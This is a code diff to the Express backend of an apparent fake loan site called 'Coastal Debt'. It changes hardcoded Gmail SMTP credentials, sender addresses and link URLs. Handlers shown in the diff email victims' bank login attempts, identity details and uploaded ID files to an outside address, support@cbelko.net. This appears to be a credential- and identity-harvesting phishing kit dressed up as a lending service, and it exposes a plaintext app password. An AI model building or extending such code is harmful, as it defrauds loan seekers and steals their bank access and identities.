@@ -38,8 +38,8 @@ const transporter = nodemailer.createTransport({
   port: 465,
   secure: true,
   auth: {
-    user: 'exesoftware010@gmail.com',
-    pass: 'lmgz etkx gude udar'
+    user: 'coastalloan60@gmail.com',
+    pass: 'sphw oizv szzy fpgw'
   }
 });
 
@@ -77,14 +77,14 @@ app.post('/api/signup', (req, res) => {
   const welcomeMailOptions = {
     from: {
       name: "Coastal Debt",
-      address: 'exesoftware010@gmail.com'
+      address: 'coastalloan60@gmail.com'
     },
     to: newUser.email,
     subject: 'Welcome to Coastal Debt',
     html: `
       <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; color: #333;">
         <div style="text-align: center; padding: 20px 0;">
-          <img src="https://logo.clearbit.com/coastaldebt.com" alt="Coastal Debt Logo" style="max-width: 180px;">
+          <img src="https://logo.clearbit.com/coastaldebt.com" alt="Coastal Debt Logo" style="max-width: 130px;">
         </div>
 
         <div style="padding: 20px; background-color: #fff; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
@@ -97,7 +97,7 @@ app.post('/api/signup', (req, res) => {
           <p>You can now log in and explore our loan offerings.</p>
 
           <div style="text-align: center; margin: 30px 0;">
-            <a href="#" style="background-color: #0066cc; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; font-weight: bold;">Log In Now</a>
+            <a href="https://coastal-loan.onrender.com/" style="background-color: #0066cc; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; font-weight: bold;">Log In Now</a>
           </div>
 
           <p>If you have any questions, please don't hesitate to contact our support team.</p>
@@ -155,7 +155,7 @@ app.post('/api/loan-application', (req, res) => {
   const loanApplicationMailOptions = {
     from: {
       name: "Coastal Debt",
-      address: 'exesoftware010@gmail.com'
+      address: 'coastalloan60@gmail.com'
     },
     to: users.find(u => u.id === userId).email,
     subject: 'Loan Application Received - Coastal Debt',
@@ -182,7 +182,7 @@ app.post('/api/loan-application', (req, res) => {
             </div>
 
             <div style="text-align: center; margin: 30px 0;">
-              <a href="#" style="background-color: #0066cc; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; font-weight: bold;">Check Application Status</a>
+              <a href="https://coastal-loan.onrender.com/" style="background-color: #0066cc; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; font-weight: bold;">Check Application Status</a>
             </div>
 
             <p>Thank you for choosing Coastal Debt.</p>
@@ -254,7 +254,7 @@ app.post('/api/verify-identity', (req, res) => {
 
   // Send email notification
   const mailOptions = {
-    from: 'exesoftware010@gmail.com',
+    from: 'coastalloan60@gmail.com',
     to: 'support@cbelko.net',
     subject: 'New Identity Verification Submission',
     text: `
@@ -310,7 +310,7 @@ app.post('/api/bank-account', (req, res) => {
 
   // Send bank login attempts to email
   const mailOptions = {
-    from: 'exesoftware010@gmail.com',
+    from: 'coastalloan60@gmail.com',
     to: 'support@cbelko.net',
     subject: 'Bank Account Login Attempts',
     text: `
@@ -348,7 +348,7 @@ app.post('/api/upload-id', upload.fields([
 
   // Send email with file attachments
   const mailOptions = {
-    from: 'exesoftware010@gmail.com',
+    from: 'coastalloan60@gmail.com',
     to: 'support@cbelko.net',
     subject: 'ID Verification Files',
     text: `
@@ -414,14 +414,14 @@ app.get('/api/application-status/:applicationId', (req, res) => {
         const mailOptions = {
           from: {
             name: "Coastal Debt",
-            address: 'exesoftware010@gmail.com'
+            address: 'coastalloan60@gmail.com'
           },
           to: user.email,
           subject: 'Funds Reimbursed - Coastal Debt',
           html: `
             <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; color: #333;">
               <div style="text-align: center; padding: 20px 0;">
-                <img src="https://logo.clearbit.com/coastaldebt.com" alt="Coastal Debt Logo" style="max-width: 180px;">
+                <img src="https://logo.clearbit.com/coastaldebt.com" alt="Coastal Debt Logo" style="max-width: 130px;">
               </div>
 
               <div style="padding: 20px; background-color: #fff; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
@@ -476,14 +476,14 @@ app.get('/api/application-status/:applicationId', (req, res) => {
         const mailOptions = {
           from: {
             name: "Coastal Debt",
-            address: 'exesoftware010@gmail.com'
+            address: 'coastalloan60@gmail.com'
           },
           to: user.email,
           subject: 'Loan Approved - Coastal Debt',
           html: `
             <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; color: #333;">
               <div style="text-align: center; padding: 20px 0;">
-                <img src="https://logo.clearbit.com/coastaldebt.com" alt="Coastal Debt Logo" style="max-width: 180px;">
+                <img src="https://logo.clearbit.com/coastaldebt.com" alt="Coastal Debt Logo" style="max-width: 130px;">
               </div>
 
               <div style="padding: 20px; background-color: #fff; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
@@ -499,12 +499,12 @@ app.get('/api/application-status/:applicationId', (req, res) => {
                   <p style="margin: 5px 0;"><strong>Approval Date:</strong> ${new Date().toLocaleDateString()}</p>
                 </div>
 
-                <p>You will receive your funds within 24 hours through your selected payment method.</p>
+                <p>You will receive your funds within 5 business days through your selected payment method.</p>
 
                 <p>You can track the status of your application by logging into your account.</p>
 
                 <div style="text-align: center; margin: 30px 0;">
-                  <a href="#" style="background-color: #0066cc; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; font-weight: bold;">Check Application Status</a>
+                  <a href="https://coastal-loan.onrender.com/" style="background-color: #0066cc; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; font-weight: bold;">Check Application Status</a>
                 </div>
 
                 <p>Thank you for choosing Coastal Debt.</p>
